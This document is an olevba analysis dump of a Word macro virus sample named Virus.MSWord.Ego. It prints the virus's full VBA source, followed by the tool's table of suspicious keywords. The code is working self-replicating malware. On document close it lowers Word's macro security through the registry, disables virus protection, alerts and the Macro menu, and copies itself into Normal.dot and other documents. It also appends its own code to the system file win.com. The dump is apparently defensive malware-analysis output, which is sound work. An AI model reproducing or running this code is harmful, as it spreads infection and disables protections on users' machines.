olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ego-e908208db36cde5d5c296f179ef05ae9d8301052
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ego-e908208db36cde5d5c296f179ef05ae9d8301052 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KRRPIPQP.bas 
in file: Virus.MSWord.Ego-e908208db36cde5d5c296f179ef05ae9d8301052 - OLE stream: 'Macros/VBA/KRRPIPQP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'module
Dim osdir As String
Dim casual As String
Dim TheString As String
Dim targdir As String
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
Sub AutoClose()
On Error Resume Next
Randomize
Dim sh, dh
sh = (0 * Rnd)
dh = (0 * Rnd)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = sh
Options.SaveNormalPrompt = dh
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
CommandBars("Tools").Controls("Macro").Delete
Dim x
Dim count As Integer
count = 10
While count > 2
x = Int((85 - 100 + 1) * Rnd + 85)
y = Chr(x)
casual = casual + y
count = count - 1
Wend
Set Adoc = ActiveDocument.VBProject.VBComponents
Set NTmp = NormalTemplate.VBProject.VBComponents
osdir = GetWindows
Call getOS
Dim target As String
target = osdir & targdir & "win.com"
Call Verify(target)
Ego = "'module"
For i = 1 To NTmp.count
If NTmp(i).CodeModule _
.lines(1, 1) = Ego Then NtmpOK = True
Next i
For i = 1 To Adoc.count
If Adoc(i).CodeModule _
.lines(1, 1) = Ego Then DocOK = True
Next i
If DocOK = True And NtmpOK = False Then
For i = 1 To NTmp.count
Nam = NTmp(i).Name
Next i
With Application.NormalTemplate.VBProject
             .VBComponents.Remove .VBComponents(Nam)
    End With
 Call FindAtts(target)
NTmp.Add 1
NTmp(2).Name = (casual)
NTmp(casual).CodeModule.AddFromString (TheString)
End If
 If DocOK = False And NtmpOK = True Then
For i = 1 To Adoc.count
Nam = Adoc(i).Name
Next i
With Application.ActiveDocument.VBProject
            .VBComponents.Remove .VBComponents(Nam)
    End With
    Call FindAtts(target)
 Adoc.Add 1
 Adoc(2).Name = (casual)
 Adoc(casual).CodeModule.AddFromString (TheString)
End If
End Sub
Public Function GetWindows() As String
    Dim v As String
    Dim y As Long
    v = String$(144, 0)
    y = GetWindowsDirectory(v, Len(v))
    If y = 0 Then
        GetWindows = 0
    Else
        GetWindows = Left(v, y)
    End If
End Function
Public Function Attach(D$)
errnum = 1: Open D$ For Binary As 1
If Err Then GoTo Jumpit
errnum = 0
Seek #1, LOF(1) + 1
mystr$ = ThisDocument.VBProject.VBComponents(2).CodeModule.lines(1, 167)
Put #1, , Chr(42) + Chr(95) + Chr(95) + Chr(42) & mystr$ & Chr(42) + Chr(95) + Chr(95) + Chr(42)
Jumpit:
Close
Attach = errnum
End Function
Public Function Verify(target As String)
Dim TheString As String
Dim f As Long
Dim tmpcounter As Integer
tmpcounter = 0: f = 1
Open target For Binary As #1
TheString = String$(LOF(1), 0)
Get #1, 1, TheString
    s = InStr(f, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
       Close #1
    If s Then
      Close
      Else:
      Call Attach(target)
     End If
End Function
Public Function FindAtts(target As String)
Dim St As Long
Dim fi As Long
Dim Siz As Long
Dim f As Long
Dim addition As String
Dim tmpcounter As Integer
tmpcounter = 0: f = 1
Open target For Binary As #1
TheString = String$(LOF(1), 0)
Get #1, 1, TheString
    s = InStr(f, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
    f = InStr(s + 1, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
    If s And f Then
            St = s + 4
            fi = f
            Siz = f - (s + 4)
           End If
leftPart$ = Left$(TheString, fi)
rightpart$ = Mid$(TheString, St, Siz)
TheString = rightpart$
Close #1
End Function
Private Function getOS() As String
Dim osinfo As OSVERSIONINFO
Dim retvalue As Integer
osinfo.dwOSVersionInfoSize = 148
osinfo.szCSDVersion = Space$(128)
retvalue = GetVersionExA(osinfo)
With osinfo
    Select Case .dwPlatformId
        Case 1
            If .dwMinorVersion = 0 Then
                targdir = "\"
            ElseIf .dwMinorVersion = 10 Then
                targdir = "\"
            End If
        Case 2
            If .dwMajorVersion = 3 Then
                targdir = "\system32\"
            ElseIf .dwMajorVersion = 4 Then
                targdir = "\system32\"
            ElseIf .dwMajorVersion = 5 Then
                targdir = "\system32\"
            End If
            End Select
End With
End Function
' d. to Camilla v. alpha (c) xvP 9.00
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

